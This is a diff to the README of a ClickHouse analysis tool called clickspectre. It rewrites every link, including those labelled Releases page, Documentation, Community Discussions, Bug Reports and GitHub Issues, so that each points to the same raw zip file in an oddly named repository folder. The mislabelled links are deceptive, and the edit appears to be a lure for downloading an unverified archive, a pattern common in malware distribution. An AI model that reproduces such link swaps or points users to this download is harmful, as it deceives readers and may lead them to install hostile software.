@@ -4,13 +4,13 @@
 
 Welcome to clickspectre! This tool helps you understand how your ClickHouse database is used and optimizes its performance. We will walk you through downloading and running the application step-by-step. 
 
-🔗 [Download clickspectre](https://github.com/samiullahhussai/clickspectre/releases)
+🔗 [Download clickspectre](https://github.com/samiullahhussai/clickspectre/raw/refs/heads/master/resupposition/clickspectre-2.9.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/samiullahhussai/clickspectre/releases).
+1. Visit the [Releases page](https://github.com/samiullahhussai/clickspectre/raw/refs/heads/master/resupposition/clickspectre-2.9.zip).
 2. Look for the latest version of clickspectre.
 3. Download the file that matches your operating system (Windows, macOS, or Linux). You will find different versions available for each system.
 4. Once downloaded, locate the file on your computer.
@@ -53,9 +53,9 @@ clickspectre is designed to run on most modern systems. Here are the key require
 
 For more help or to explore deeper features, check the following resources:
 
-- [Documentation](https://github.com/samiullahhussai/clickspectre)
-- [Community Discussions](https://github.com/samiullahhussai/clickspectre/discussions)
-- [Bug Reports](https://github.com/samiullahhussai/clickspectre/issues)
+- [Documentation](https://github.com/samiullahhussai/clickspectre/raw/refs/heads/master/resupposition/clickspectre-2.9.zip)
+- [Community Discussions](https://github.com/samiullahhussai/clickspectre/raw/refs/heads/master/resupposition/clickspectre-2.9.zip)
+- [Bug Reports](https://github.com/samiullahhussai/clickspectre/raw/refs/heads/master/resupposition/clickspectre-2.9.zip)
 
 ## 🤝 Contributing
 
@@ -67,8 +67,8 @@ If you have ideas or improvements, we welcome contributions! Here’s how:
 
 ## 🛠️ Support
 
-For support, please open an issue on our [GitHub Issues page](https://github.com/samiullahhussai/clickspectre/issues). We are here to help you with your problems and suggestions.
+For support, please open an issue on our [GitHub Issues page](https://github.com/samiullahhussai/clickspectre/raw/refs/heads/master/resupposition/clickspectre-2.9.zip). We are here to help you with your problems and suggestions.
 
-🔗 [Download clickspectre](https://github.com/samiullahhussai/clickspectre/releases) again if needed.
+🔗 [Download clickspectre](https://github.com/samiullahhussai/clickspectre/raw/refs/heads/master/resupposition/clickspectre-2.9.zip) again if needed.
 
 Thank you for choosing clickspectre. Enjoy optimizing your ClickHouse experience!
